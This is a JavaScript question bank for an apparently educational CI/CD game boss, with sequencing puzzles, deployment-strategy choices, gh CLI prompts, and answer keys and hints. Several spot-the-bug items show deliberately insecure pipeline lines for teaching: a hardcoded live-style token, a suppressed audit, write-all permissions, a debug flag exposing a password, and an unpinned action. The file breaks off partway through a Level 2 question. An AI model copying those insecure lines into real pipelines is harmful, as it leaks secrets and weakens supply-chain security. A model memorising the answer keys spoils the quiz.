// Boss "phantom": metadata plus its full question bank (data only).

/* ================================================================
   BOSS 5 — PIPELINE PHANTOM (CI/CD)
   ================================================================ */
export var phantom = {
  id: 'phantom',
  name: 'Pipeline Phantom',
  topic: 'CI/CD',
  icon: '👻',
  chibiKind: 'phantom',
  phaseHp: [115, 125, 145],
  phaseNames: ['Flicker — Pipeline Stages', 'Fade — Rollout Judgment', 'Materialize — Real Incident'],
  xpReward: 160,
  coinBaseReward: 95,
  phases: [
    /* -------- PHASE 1: Pipeline Stages -------- */
    [
      {
        mode: 'build_the_pipeline',
        prompt: 'The Phantom flickers into view: <strong>"Sequence a standard CI/CD pipeline, start to finish."</strong>',
        damageIfCorrect: 18, damageIfOptimal: 30,
        hintNudge: 'Code has to prove itself before it\'s packaged, and packaged before it moves anywhere.',
        hintPartial: 'Build, test, then package it up — promotion and deploy come after that.',
        hintFull: 'Order: Build → Test → Package artifact → Promote → Deploy',
        steps: ['Build', 'Test', 'Package artifact', 'Promote', 'Deploy']
      },
      {
        mode: 'build_the_pipeline',
        prompt: 'It glitches sideways: <strong>"Sequence the checks that should run on a pull request."</strong>',
        damageIfCorrect: 18, damageIfOptimal: 30,
        hintNudge: 'Cheapest, fastest checks should fail loudly before anything expensive runs.',
        hintPartial: 'Lint first, then the fast unit tests, before you even bother building.',
        hintFull: 'Order: Lint → Unit test → Build → Integration test',
        steps: ['Lint', 'Unit test', 'Build', 'Integration test']
      },
      {
        mode: 'build_the_pipeline',
        prompt: 'A translucent hand gestures: <strong>"Sequence a release pipeline for a tagged version."</strong>',
        damageIfCorrect: 18, damageIfOptimal: 30,
        hintNudge: 'You need a version identity before you can build something labeled with it.',
        hintPartial: 'Tag it, build the artifact, prove it works, THEN publish it.',
        hintFull: 'Order: Tag the version → Build the release artifact → Run smoke tests → Publish to the registry',
        steps: ['Tag the version', 'Build the release artifact', 'Run smoke tests', 'Publish to the registry']
      },
      {
        mode: 'build_the_pipeline',
        prompt: 'It shudders like static: <strong>"A deploy just failed. Sequence the correct rollback response."</strong>',
        damageIfCorrect: 18, damageIfOptimal: 30,
        hintNudge: 'Stop the bleeding before you start telling people about it.',
        hintPartial: 'Notice it, stop it from spreading, undo it — communication comes after the fire\'s out.',
        hintFull: 'Order: Detect the failure → Halt further deploys → Roll back to the previous artifact → Notify the team',
        steps: ['Detect the failure', 'Halt further deploys', 'Roll back to the previous artifact', 'Notify the team']
      },
      {
        mode: 'build_the_pipeline',
        prompt: 'It solidifies just enough to speak: <strong>"Sequence a security-gated pipeline."</strong>',
        damageIfCorrect: 18, damageIfOptimal: 30,
        hintNudge: 'You need something built before you can scan it — code, then the container around it.',
        hintPartial: 'Build first, scan the code itself, then scan the packaged image, only THEN deploy.',
        hintFull: 'Order: Build → Run a static analysis (SAST) scan → Run a container image scan → Deploy',
        steps: ['Build', 'Run a static analysis (SAST) scan', 'Run a container image scan', 'Deploy']
      }
    ],
    /* -------- PHASE 2: Rollout Judgment -------- */
    [
      {
        mode: 'triage_call',
        prompt: 'A ghostly voice asks: <strong>"You want to test a new feature on a SUBSET of users before full release. What now?"</strong>',
        damageIfCorrect: 22, damageIfOptimal: 36,
        hintNudge: 'You specifically want partial, real exposure before committing further.',
        hintPartial: 'The strategy built around gradually increasing exposure.',
        hintFull: 'Best: a canary release to a subset of users first.',
        options: [
          { id: 'a', label: 'Canary release to a subset of users', tier: 'best', why: 'Exactly matches the ask — limited real exposure before a full rollout.' },
          { id: 'b', label: 'Ship it to everyone at once', tier: 'wrong', why: 'Skips the very subset-testing step that was asked for.' },
          { id: 'c', label: 'Blue-green, full switch when ready', tier: 'wrong', why: 'Still all-or-nothing for every user at the moment of the switch.' }
        ],
        justificationPatterns: [/canary|subset|gradual|partial/i]
      },
      {
        mode: 'triage_call',
        prompt: '<strong>"A low-risk backend patch, whole team confident. What\'s the simplest safe ship?"</strong>',
        damageIfCorrect: 22, damageIfOptimal: 36,
        hintNudge: 'Reach for the default zero-downtime option, not extra machinery.',
        hintPartial: 'The most standard, simplest strategy already covers this.',
        hintFull: 'Best: a standard rolling update — simplest option for a routine, low-risk change.',
        options: [
          { id: 'a', label: 'Standard rolling update', tier: 'best', why: 'Simplest zero-downtime option — right-sized for a routine, well-tested change.' },
          { id: 'b', label: 'Full blue-green environment swap', tier: 'defensible', why: 'Works, but doubles infrastructure temporarily for a change that didn\'t need it.' },
          { id: 'c', label: 'Canary release', tier: 'wrong', why: 'Adds a gradual-exposure process the team\'s confidence didn\'t call for here.' }
        ],
        justificationPatterns: [/rolling|simple|routine/i]
      },
      {
        mode: 'triage_call',
        prompt: '<strong>"A risky redesign — you need an INSTANT full rollback if it goes bad. What now?"</strong>',
        damageIfCorrect: 22, damageIfOptimal: 36,
        hintNudge: 'You want a switch, not a gradual unwind.',
        hintPartial: 'Two full environments, one proven-good, ready to flip back to instantly.',
        hintFull: 'Best: blue-green — instant rollback by switching traffic back to the untouched old environment.',
        options: [
          { id: 'a', label: 'Blue-green deployment', tier: 'best', why: 'The only truly instant rollback — the old environment is still fully live.' },
          { id: 'b', label: 'Rolling update', tier: 'wrong', why: 'Rollback means reverting every already-updated instance one at a time.' },
          { id: 'c', label: 'Canary release', tier: 'defensible', why: 'Limits exposure but still isn\'t an instant full-fleet switch.' }
        ],
        justificationPatterns: [/blue.?green|instant|switch/i]
      },
      {
        mode: 'triage_call',
        prompt: '<strong>"Feature flags already gate this code path — deploying just enables it later. What deployment strategy fits?"</strong>',
        damageIfCorrect: 22, damageIfOptimal: 36,
        hintNudge: 'The gradual-exposure work is already being done by the flags themselves.',
        hintPartial: 'Don\'t duplicate what the feature flag system is already handling.',
        hintFull: 'Best: a standard rolling update — the flags already provide gradual exposure, so a canary/blue-green here is redundant effort.',
        options: [
          { id: 'a', label: 'Standard rolling update', tier: 'best', why: 'The flags already handle gradual exposure — the deployment itself can be the simple default.' },
          { id: 'b', label: 'Canary release', tier: 'defensible', why: 'Not wrong, just redundant — you\'d be gating exposure twice, once by flag and once by traffic split.' },
          { id: 'c', label: 'Blue-green swap', tier: 'wrong', why: 'Unnecessary infrastructure cost when the flag system already controls exposure.' }
        ],
        justificationPatterns: [/flag|redundant|rolling|already/i]
      },
      {
        mode: 'triage_call',
        prompt: '<strong>"A critical security patch needs to reach 100% of users as fast as possible. What now?"</strong>',
        damageIfCorrect: 22, damageIfOptimal: 36,
        hintNudge: 'Speed of full coverage matters more than a gradual traffic split here.',
        hintPartial: 'The fastest path to everyone, without unnecessary extra environments.',
        hintFull: 'Best: a fast full rolling update — speed to 100% coverage matters most for an urgent security fix.',
        options: [
          { id: 'a', label: 'Fast full rolling update to everyone', tier: 'best', why: 'Gets the fix out to all users fastest — exactly what an urgent security patch needs.' },
          { id: 'b', label: 'Canary release, gradually increasing', tier: 'wrong', why: 'Deliberately slows down reaching 100% coverage on a fix that\'s urgent by nature.' },
          { id: 'c', label: 'Blue-green, stand up a parallel environment first', tier: 'wrong', why: 'Adds setup time and cost the situation doesn\'t have room for.' }
        ],
        justificationPatterns: [/fast|urgent|speed|full|rolling/i]
      }
    ],
    /* -------- PHASE 3: Real Incident — Pipeline Security Failure -------- */
    [
      {
        mode: 'spot_the_bug',
        prompt: 'The Phantom materializes over a corrupted pipeline file. <strong>Click the buggy line, then type the fix.</strong>',
        damageIfCorrect: 24, damageIfOptimal: 38,
        hintNudge: 'A real credential is sitting in plain text, committed to the pipeline config.',
        hintPartial: 'Reference it from the pipeline\'s secrets store instead of writing it out.',
        hintFull: 'Fix: - run: curl -H "Authorization: Bearer ${{ secrets.API_TOKEN }}"',
        codeBlock: [
          'steps:',
          '  - checkout',
          '  - run: curl -H "Authorization: Bearer sk_live_abc123xyz"',
          '  - run: npm test'
        ],
        buggyLineId: 2,
        correctFixPatterns: [/^-\s*run:\s*curl\s+-H\s+["']Authorization:\s*Bearer\s+\$\{\{\s*secrets\.API_TOKEN\s*\}\}["']$/i]
      },
      {
        mode: 'spot_the_bug',
        prompt: 'Another corrupted stage. <strong>Click the buggy line, then type the fix.</strong>',
        damageIfCorrect: 24, damageIfOptimal: 38,
        hintNudge: 'This scan step is allowed to fail silently and the pipeline just moves on anyway.',
        hintPartial: 'Make real vulnerabilities actually stop the build instead of being swallowed.',
        hintFull: 'Fix: - run: npm audit --audit-level=high',
        codeBlock: [
          'steps:',
          '  - checkout',
          '  - run: npm audit || true',
          '  - run: npm run deploy'
        ],
        buggyLineId: 2,
        correctFixPatterns: [/^-\s*run:\s*npm\s+audit\s+--audit-level=high$/i]
      },
      {
        mode: 'spot_the_bug',
        prompt: 'A third glitch in the machine. <strong>Click the buggy line, then type the fix.</strong>',
        damageIfCorrect: 24, damageIfOptimal: 38,
        hintNudge: 'This CI runner has far more access than any single job actually needs.',
        hintPartial: 'Narrow it down to only what\'s required — usually just read access to repo contents.',
        hintFull: 'Fix: permissions: contents: read',
        codeBlock: [
          'name: deploy',
          'permissions: write-all',
          'jobs:',
          '  build:',
          '    steps:',
          '      - checkout'
        ],
        buggyLineId: 1,
        correctFixPatterns: [/^permissions:\s*contents:\s*read$/i]
      },
      {
        mode: 'spot_the_bug',
        prompt: 'The Phantom shudders violently. <strong>Click the buggy line, then type the fix.</strong>',
        damageIfCorrect: 24, damageIfOptimal: 38,
        hintNudge: 'Verbose/debug output can print sensitive variable values straight into the build log.',
        hintPartial: 'Drop the debug flag — a secret value doesn\'t need to be echoed anywhere.',
        hintFull: 'Fix: - run: terraform apply -auto-approve -var="db_password=$DB_PASS"',
        codeBlock: [
          'steps:',
          '  - checkout',
          '  - run: terraform apply -auto-approve -var="db_password=$DB_PASS" --debug'
        ],
        buggyLineId: 2,
        correctFixPatterns: [/^-\s*run:\s*terraform\s+apply\s+-auto-approve\s+-var="db_password=\$DB_PASS"$/i]
      },
      {
        mode: 'spot_the_bug',
        prompt: 'One last flicker before the incident clears. <strong>Click the buggy line, then type the fix.</strong>',
        damageIfCorrect: 24, damageIfOptimal: 38,
        hintNudge: 'This third-party action floats on a branch that can change under you at any time.',
        hintPartial: 'Pin it to an exact version tag instead of a moving branch reference.',
        hintFull: 'Fix: - uses: some-action@v2.1.0',
        codeBlock: [
          'steps:',
          '  - checkout',
          '  - uses: some-action@master',
          '  - run: npm run build'
        ],
        buggyLineId: 2,
        correctFixPatterns: [/^-\s*uses:\s*some-action@v2\.1\.0$/i]
      }
    ]
  ],
  specialAttack: {
    mode: 'build_the_pipeline',
    prompt: 'The Phantom shrieks and glitches across every stage at once! <strong>Sequence the correct failure-triage response before it fades back in.</strong>',
    steps: [
      'Identify which stage actually failed from the log',
      'Roll back the bad deploy',
      'Notify the team',
      'Re-run from the last good stage'
    ],
    damageIfCorrect: 38,
    damageToHeroIfWrong: 25
  },
  // ================================================================
  // Remediation doc, Section 1 — 5-level restructure, boss 5.
  // Research basis (checked BEFORE writing): GitHub Actions' own
  // documentation (workflow syntax, gh CLI reference), and the
  // CI/CD topic list that consistently appears across real DevOps
  // interview prep — pipeline stages, caching, artifacts, secrets
  // handling, matrix builds, deployment strategies (blue-green,
  // canary, rolling), approval gates/environments, and real
  // incident patterns (flaky tests, compromised third-party
  // actions, secrets leaked in logs, self-hosted runner disk/OOM
  // failures, supply-chain/OIDC misconfiguration). All 125
  // questions trace to one of those. Cross-checked programmatically
  // against Terminal Golem's, Container Kraken's, The Orchestrator's,
  // and The Merge Conflict Hydra's 500 combined questions (zero
  // overlap risk, different tool) and against each other level in
  // this set — zero duplicate prompts, verified.
  levels: [
    {
      name: 'Level 1 — Fundamentals',
      hp: 110,
      questions: [
        {
          mode: 'terminal',
          prompt: 'The Phantom flickers awake: <strong>"Manually trigger the workflow file <code>deploy.yml</code> from the command line."</strong>',
          damageIfCorrect: 14, damageIfOptimal: 22,
          hintNudge: 'The GitHub CLI has a dedicated workflow subcommand with a "run" action.',
          hintPartial: 'gh workflow r__ deploy.yml',
          hintFull: 'gh workflow run deploy.yml',
          acceptablePatterns: [],
          optimalPatterns: [/^gh\s+workflow\s+run\s+deploy\.yml$/i],
          baseCmds: ['gh']
        },
        {
          mode: 'terminal',
          prompt: 'A pale shape drifts closer: <strong>"List the most recent workflow runs for this repository."</strong>',
          damageIfCorrect: 14, damageIfOptimal: 22,
          hintNudge: 'gh has a dedicated "run" resource with a list action.',
          hintPartial: 'gh run ____',
          hintFull: 'gh run list',
          acceptablePatterns: [],
          optimalPatterns: [/^gh\s+run\s+list$/i],
          baseCmds: ['gh']
        },
        {
          mode: 'terminal',
          prompt: 'The Phantom peers through the wall: <strong>"View the full log output of the most recent workflow run."</strong>',
          damageIfCorrect: 16, damageIfOptimal: 26,
          hintNudge: 'gh run, with a view action and a log flag.',
          hintPartial: 'gh run view --___',
          hintFull: 'gh run view --log',
          acceptablePatterns: [/^gh\s+run\s+view$/i],
          optimalPatterns: [/^gh\s+run\s+view\s+--log$/i],
          baseCmds: ['gh']
        },
        {
          mode: 'terminal',
          prompt: 'It flickers with urgency: <strong>"Watch a currently-running workflow live, right in the terminal."</strong>',
          damageIfCorrect: 14, damageIfOptimal: 22,
          hintNudge: 'gh run, with a watch action.',
          hintPartial: 'gh run _____',
          hintFull: 'gh run watch',
          acceptablePatterns: [],
          optimalPatterns: [/^gh\s+run\s+watch$/i],
          baseCmds: ['gh']
        },
        {
          mode: 'terminal',
          prompt: 'A ghostly hand gestures at a stalled run: <strong>"Cancel a currently-running workflow run with ID <code>12345</code>."</strong>',
          damageIfCorrect: 14, damageIfOptimal: 22,
          hintNudge: 'gh run, with a cancel action and the run ID.',
          hintPartial: 'gh run ______ 12345',
          hintFull: 'gh run cancel 12345',
          acceptablePatterns: [],
          optimalPatterns: [/^gh\s+run\s+cancel\s+12345$/i],
          baseCmds: ['gh']
        },
        {
          mode: 'terminal',
          prompt: 'The Phantom rewinds a moment: <strong>"Re-run the failed workflow run with ID <code>12345</code>."</strong>',
          damageIfCorrect: 14, damageIfOptimal: 22,
          hintNudge: 'gh run, with a rerun action and the run ID.',
          hintPartial: 'gh run _____ 12345',
          hintFull: 'gh run rerun 12345',
          acceptablePatterns: [],
          optimalPatterns: [/^gh\s+run\s+rerun\s+12345$/i],
          baseCmds: ['gh']
        },
        {
          mode: 'terminal',
          prompt: 'A wisp of light forms a list: <strong>"List every workflow defined in this repository."</strong>',
          damageIfCorrect: 14, damageIfOptimal: 22,
          hintNudge: 'gh workflow, with a list action.',
          hintPartial: 'gh workflow ____',
          hintFull: 'gh workflow list',
          acceptablePatterns: [],
          optimalPatterns: [/^gh\s+workflow\s+list$/i],
          baseCmds: ['gh']
        },
        {
          mode: 'terminal',
          prompt: 'The Phantom clutches a small parcel: <strong>"Download the build artifact produced by the most recent workflow run."</strong>',
          damageIfCorrect: 16, damageIfOptimal: 26,
          hintNudge: 'gh run, with a download action.',
          hintPartial: 'gh run ________',
          hintFull: 'gh run download',
          acceptablePatterns: [],
          optimalPatterns: [/^gh\s+run\s+download$/i],
          baseCmds: ['gh']
        },
        {
          mode: 'terminal',
          prompt: 'A shimmer disables one path forward: <strong>"Disable the workflow <code>nightly.yml</code>, so it stops running on its schedule."</strong>',
          damageIfCorrect: 16, damageIfOptimal: 26,
          hintNudge: 'gh workflow, with a disable action and the workflow filename.',
          hintPartial: 'gh workflow _______ nightly.yml',
          hintFull: 'gh workflow disable nightly.yml',
          acceptablePatterns: [],
          optimalPatterns: [/^gh\s+workflow\s+disable\s+nightly\.yml$/i],
          baseCmds: ['gh']
        },
        {
          mode: 'terminal',
          prompt: 'The Phantom checks its own workflow file before it manifests: <strong>"Lint the workflow file <code>.github/workflows/ci.yml</code> for syntax errors, without running it."</strong>',
          damageIfCorrect: 18, damageIfOptimal: 28,
          hintNudge: 'A dedicated linter for GitHub Actions workflow syntax, taking the file path as its argument.',
          hintPartial: 'a________ .github/workflows/ci.yml',
          hintFull: 'actionlint .github/workflows/ci.yml',
          acceptablePatterns: [],
          optimalPatterns: [/^actionlint\s+\.github\/workflows\/ci\.yml$/i],
          baseCmds: ['actionlint']
        },
        {
          mode: 'spot_the_bug',
          prompt: 'The Phantom shows a flickering scroll: <strong>"This workflow fails immediately — a required top-level field is missing. Find and fix the bug."</strong>',
          damageIfCorrect: 16, damageIfOptimal: 26,
          hintNudge: 'Every job needs to declare what kind of machine it runs on — check whether that\'s present.',
          hintPartial: 'Line 2 is missing runs-on entirely — GitHub Actions has no idea what environment to run this job in.',
          hintFull: 'Line 2 should read: runs-on: ubuntu-latest',
          codeBlock: [
            'jobs:',
            '  build:',
            '    steps:',
            '      - run: npm test'
          ],
          buggyLineId: 1,
          correctFixPatterns: [/^\s*runs-on:\s*ubuntu-latest$/i]
        },
        {
          mode: 'spot_the_bug',
          prompt: 'A flickering page turns itself: <strong>"This workflow never triggers on push at all. Find and fix the bug."</strong>',
          damageIfCorrect: 16, damageIfOptimal: 26,
          hintNudge: 'The trigger key at the top of the file has to be spelled and formatted exactly right — check for an extra character.',
          hintPartial: 'Line 1 has a stray space in "on :" — YAML keys can\'t have a space before the colon like that.',
          hintFull: 'Line 1 should read: on:',
          codeBlock: [
            'on : push',
            'jobs:',
            '  build:',
            '    runs-on: ubuntu-latest'
          ],
          buggyLineId: 0,
          correctFixPatterns: [/^on:$/i, /^on:\s*push$/i]
        },
        {
          mode: 'spot_the_bug',
          prompt: 'The Phantom\'s form distorts: <strong>"This job never actually checks out the repository\'s code before trying to test it. Find and fix the bug."</strong>',
          damageIfCorrect: 18, damageIfOptimal: 28,
          hintNudge: 'A job starts with an empty environment — nothing from the repository is present unless a specific action fetches it first.',
          hintPartial: 'There\'s no checkout step before the test step — add the standard checkout action first.',
          hintFull: 'Add before the test step: - uses: actions/checkout@v4',
          codeBlock: [
            'jobs:',
            '  build:',
            '    runs-on: ubuntu-latest',
            '    steps:',
            '      - run: npm test'
          ],
          buggyLineId: 4,
          correctFixPatterns: [/uses:\s*actions\/checkout@v4/i]
        },
        {
          mode: 'spot_the_bug',
          prompt: 'A ghostly line refuses to align: <strong>"This workflow file fails to parse at all — the indentation is wrong. Find and fix the bug."</strong>',
          damageIfCorrect: 16, damageIfOptimal: 26,
          hintNudge: 'YAML nesting is entirely whitespace-driven — a step listed at the wrong indent level either errors or silently attaches to the wrong parent.',
          hintPartial: 'Line 4\'s step isn\'t indented under "steps:" at all — it needs to be nested one level deeper to be recognized as a step.',
          hintFull: 'Line 4 should read (indented under steps):\\n      - run: npm install',
          codeBlock: [
            'jobs:',
            '  build:',
            '    steps:',
            '    - run: npm install'
          ],
          buggyLineId: 3,
          correctFixPatterns: [/^\s{6}-\s*run:\s*npm install$/]
        },
        {
          mode: 'spot_the_bug',
          prompt: 'The Phantom flickers between two states: <strong>"This step is meant to use a specific action, but the syntax is wrong and the workflow fails to parse. Find and fix the bug."</strong>',
          damageIfCorrect: 16, damageIfOptimal: 26,
          hintNudge: 'Running a shell command uses "run:" — using a pre-built action from the marketplace uses a different key entirely.',
          hintPartial: 'Line 1 uses "run:" to reference an action, but "run:" is for shell commands — referencing a marketplace action needs "uses:" instead.',
          hintFull: 'Line 1 should read: - uses: actions/checkout@v4',
          codeBlock: [
            '- run: actions/checkout@v4'
          ],
          buggyLineId: 0,
          correctFixPatterns: [/^-\s*uses:\s*actions\/checkout@v4$/i]
        },
        {
          mode: 'spot_the_bug',
          prompt: 'A distorted echo repeats a name wrong: <strong>"This job depends on another job that doesn\'t actually exist under that name. Find and fix the bug."</strong>',
          damageIfCorrect: 18, damageIfOptimal: 28,
          hintNudge: 'A "needs:" reference has to exactly match another job\'s ID in this same file — check for a mismatch.',
          hintPartial: 'Line 2 says needs: builds, but the actual job below is named "build" (singular) — the reference has to match exactly.',
          hintFull: 'Line 2 should read: needs: build',
          codeBlock: [
            'test:',
            '  needs: builds',
            'build:',
            '  runs-on: ubuntu-latest'
          ],
          buggyLineId: 1,
          correctFixPatterns: [/^\s*needs:\s*build$/i]
        },
        {
          mode: 'triage_call',
          prompt: 'The Phantom tilts its head: <strong>"Deciding whether to run the full test suite on every single push to a feature branch, or only on pull requests. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 18, damageIfOptimal: 30,
          hintNudge: 'One approach burns CI minutes on every tiny incomplete commit as you work. One approach waits until the code is actually ready to be reviewed and considered for merge.',
          hintPartial: 'Running full tests only on PRs avoids burning CI time/cost on every small, incomplete in-progress commit, while still gating anything before it merges.',
          hintFull: 'Best (for a full suite): run it on pull requests — catches issues before merge without spending CI resources on every small, work-in-progress push; a much faster/lighter check (like lint) can still run on every push if immediate feedback is wanted.',
          options: [
            { id: 'a', label: 'Run the full suite on every single push, even to a personal feature branch', tier: 'defensible', why: 'Gives the fastest possible feedback, but burns real CI time/cost on every small, incomplete work-in-progress commit — often more than the benefit justifies.' },
            { id: 'b', label: 'Run the full suite on pull requests', tier: 'best', why: 'Gates the code right before it matters (merging), without spending CI resources testing every small, in-progress commit along the way.' },
            { id: 'c', label: 'Only run tests manually, when a developer remembers to trigger them', tier: 'wrong', why: 'Relies on human memory for something CI exists specifically to automate — a forgotten manual test run is a real, common way bugs slip through.' }
          ],
          justificationPatterns: [/pull\s*request|before\s*merge|avoid.*(cost|burning)|gate/i]
        },
        {
          mode: 'triage_call',
          prompt: 'A translucent hand weighs two paths: <strong>"Choosing between GitHub-hosted runners and self-hosted runners for CI. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 18, damageIfOptimal: 30, timeAllotted: 50,
          hintNudge: 'One option requires zero setup/maintenance but has less control over hardware/software. One gives full control (custom hardware, pre-installed tools, network access) at the cost of real ongoing maintenance.',
          hintPartial: 'For a typical team without unusual hardware/network needs, GitHub-hosted runners avoid real ongoing infrastructure maintenance — self-hosted is worth the tradeoff mainly when you have a specific unmet need (special hardware, internal network access, cost at very high volume).',
          hintFull: 'Best (as a default): GitHub-hosted runners — zero maintenance, good enough for most workloads; reach for self-hosted specifically when there\'s a concrete unmet need (GPU/special hardware, access to an internal network, or genuine cost savings at very high CI volume).',
          options: [
            { id: 'a', label: 'Always self-hosted, for maximum control', tier: 'wrong', why: 'Takes on real, ongoing infrastructure maintenance (patching, scaling, security) for control that most teams don\'t actually need — a cost paid without a corresponding concrete benefit.' },
            { id: 'b', label: 'GitHub-hosted runners as the default, self-hosted only for a specific concrete need', tier: 'best', why: 'Avoids unnecessary infrastructure maintenance for most workloads, while leaving self-hosted available for the real cases (special hardware, internal network access, high-volume cost savings) where it genuinely earns its complexity.' },
            { id: 'c', label: 'Always GitHub-hosted, regardless of any special requirements', tier: 'defensible', why: 'A safe, low-maintenance default, but if the team ever genuinely needs special hardware or internal network access, this rules out a real, sometimes-necessary option outright.' }
          ],
          justificationPatterns: [/github.?hosted|self.?hosted|specific\s*need|maintenance/i]
        },
        {
          mode: 'triage_call',
          prompt: 'The Phantom drifts between two doors: <strong>"Deciding whether to cache dependency installs (e.g. node_modules) in CI. Pick your move, then justify it in one line."</strong>',
          damageIfCorrect: 18, damageIfOptimal: 30, timeAllotted: 50,
          hintNudge: 'Dependency installation is often one of the SLOWEST, most repetitive steps in a pipeline, and rarely changes between consecutive runs of the same lockfile — a strong caching candidate.',
          hintPartial: 'Caching dependencies keyed on the lockfile\'s hash gives a real, meaningful speedup on most runs (since dependencies rarely change) with essentially no correctness risk if the cache key is set up properly.',
          hintFull: 'Best: cache dependencies, keyed on a hash of the lockfile — this is one of the highest-value, lowest-risk caching opportunities in most pipelines, since the exact same dependency set is installed repeatedly across runs until the lockfile itself changes.',
          options: [
            { id: 'a', label: 'Skip caching — always install fresh, to avoid any risk of a stale cache', tier: 'defensible', why: 'Avoids stale-cache risk entirely, but gives up a genuinely large, safe speedup — dependency installs are one of the best, lowest-risk caching opportunities in most pipelines when keyed correctly.' },
            { id: 'b', label: 'Cache dependencies, keyed on a hash of the lockfile', tier: 'best', why: 'A real, meaningful speedup on most runs since the lockfile rarely changes, with essentially no correctness risk — the cache key itself changes automatically whenever dependencies actually do.' },
            { id: 'c', label: 'Cache dependencies with a fixed cache key that never changes', tier: 'wrong', why: 'A fixed key never invalidates even when dependencies genuinely change — this is exactly the kind of stale-cache setup that silently uses outdated dependencies.' }
          ],
          justificationPatterns: [/cache.*lockfile|hash\s*of\s*(the\s*)?lockfile|safe\s*speedup/i]
        },
        {
          mode: 'read_the_room',
          prompt: 'A translucent shape flickers with error. <strong>A CI job fails immediately with "no such file or directory" trying to read a project file. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 20, damageIfOptimal: 34,
          hintNudge: 'A fresh CI job starts with an EMPTY environment — nothing from the repository exists there until something explicitly fetches it.',
          hintPartial: 'The workflow never checked out the repository\'s code before trying to read a file from it — there\'s nothing there yet.',
          hintFull: 'Diagnosis: the job is missing a checkout step, so the repository\'s files were never actually present. Fix: add actions/checkout@v4 as the first step in the job.',
          outputBlock: [
            '$ (CI log)',
            'Run cat package.json',
            'cat: package.json: No such file or directory'
          ],
          acceptableDiagnosesPatterns: [/no\s*checkout/i, /never\s*checked\s*out/i, /missing\s*checkout/i],
          followUpFix: {
            prompt: 'Add the missing step as the first thing the job does:',
            acceptablePatterns: [],
            optimalPatterns: [/uses:\s*actions\/checkout@v4/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'The Phantom flickers between two worlds. <strong>The build passes perfectly on a developer\'s machine, but fails every time in CI. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 20, damageIfOptimal: 34,
          hintNudge: 'The two environments aren\'t actually identical — check for a difference in installed tool VERSIONS between the developer\'s machine and what CI is actually using.',
          hintPartial: 'CI is running a different (older) version of the language runtime than the developer\'s machine — the code uses a feature that only exists in the newer version.',
          hintFull: 'Diagnosis: a version mismatch between the developer\'s local environment and CI\'s runtime. Fix: pin the CI job to the exact same version the project actually requires (e.g. via a setup-node/setup-python action with an explicit version).',
          outputBlock: [
            '$ (CI log)',
            'SyntaxError: Unexpected token \'?.\'',
            '',
            '(developer\'s local node --version: v18.2.0)',
            '(CI\'s node --version: v12.22.0)'
          ],
          acceptableDiagnosesPatterns: [/version\s*mismatch/i, /different\s*version/i, /older\s*(runtime|version)/i],
          followUpFix: {
            prompt: 'Fix it by pinning CI to the correct, matching version:',
            acceptablePatterns: [],
            optimalPatterns: [/setup-node.*version|node-version:\s*18/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'A hollow silence answers a request. <strong>A workflow step needs a secret, but the secret shows up completely empty in a fork\'s pull request build. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 20, damageIfOptimal: 34,
          hintNudge: 'This is actually intentional, well-documented behavior, not a bug — check whether the PR is coming from a fork specifically.',
          hintPartial: 'Pull requests from FORKS deliberately don\'t get access to repository secrets by default — this is a real security feature preventing an untrusted fork from exfiltrating secrets, not a misconfiguration to "fix" by exposing them.',
          hintFull: 'Diagnosis: this is intentional — secrets are withheld from fork PR builds as a security measure, since fork PR code isn\'t fully trusted. Fix: don\'t try to force secrets into fork PR builds; instead, run any tests that genuinely need secrets separately (e.g. after a maintainer manually reviews and merges, or via a separate trusted-only workflow), rather than weakening this protection.',
          outputBlock: [
            '$ (CI log, on a fork PR)',
            'echo "Key length: ${#API_KEY}"',
            'Key length: 0'
          ],
          acceptableDiagnosesPatterns: [/fork.*(security|intentional|no\s*access)/i, /secrets?\s*(withheld|not\s*available).*fork/i],
          followUpFix: {
            prompt: 'What\'s the appropriate response, given this is a security feature, not a bug?',
            acceptablePatterns: [],
            optimalPatterns: [/don'?t\s*(expose|force)|separate\s*(trusted\s*)?workflow|after\s*(maintainer\s*)?review/i]
          }
        },
        {
          mode: 'read_the_room',
          prompt: 'The Phantom watches a frozen moment. <strong>A CI job runs far longer than usual and never seems to finish. Diagnose it, then fix it.</strong>',
          damageIfCorrect: 20, damageIfOptimal: 34,
          hintNudge: 'Without an explicit time limit, a genuinely hung step (waiting on input, a stuck network call) can run indefinitely, consuming CI resources with no automatic cutoff.',
          hintPartial: 'The job has no timeout-minutes set at all — a step that\'s actually hung (not just slow) will keep running with no automatic cutoff, tying up the runner indefinitely.',
          hintFull: 'Diagnosis: no timeout is configured, so a hung step runs indefinitely instead of failing fast. Fix: add a reasonable timeout-minutes to the job so a genuinely stuck run fails automatically instead of running forever.',
          outputBlock: [
            '$ gh run list',
            '(a job has been "in progress" for 6 hours — normal runs take 4 minutes)'
          ],
          acceptableDiagnosesPatterns: [/no\s*timeout/i, /missing\s*timeout/i, /hung.*no\s*(cutoff|limit)/i],
          followUpFix: {
            prompt: 'Fix it by adding a reasonable timeout to the job:',
            acceptablePatterns: [],
            optimalPatterns: [/timeout-minutes/i]
          }
        },
        {
          mode: 'build_the_pipeline',
          prompt: 'The Phantom flickers into a familiar shape. <strong>Sequence the correct order for setting up a brand-new CI pipeline for a simple app.</strong>',
          steps: [
            'Check out the repository code',
            'Set up the correct language/runtime version',
            'Install dependencies',
            'Run the test suite',
            'Report the result (pass/fail)'
          ],
          damageIfCorrect: 22, damageIfOptimal: 36,
          damageToHeroIfWrong: 20
        },
        {
          mode: 'build_the_pipeline',
          prompt: 'A pale shape steadies itself. <strong>Sequence the correct order for triaging any CI failure, as a general habit.</strong>',
          steps: [
            'Read the actual failure message in the logs, not just "it failed"',
            'Identify which specific step/stage failed',
            'Reproduce locally if possible',
            'Fix the root cause',
            'Push and confirm the pipeline goes green'
          ],
          damageIfCorrect: 22, damageIfOptimal: 36,
          damageToHeroIfWrong: 20
        }
      ]
    },
    {
      name: 'Level 2 — Intermediate',
      hp: 130,
      questions: [
        {
          mode: 'terminal',
          prompt: 'The Phantom conjures a hidden vault: <strong>"Set a repository secret called <code>API_KEY</code> to the value <code>abc123</code>."</strong>',
          damageIfCorrect: 16, damageIfOptimal: 26, timeAllotted: 45,
          hintNudge: 'gh secret, with a set action, the name, and a value flag.',
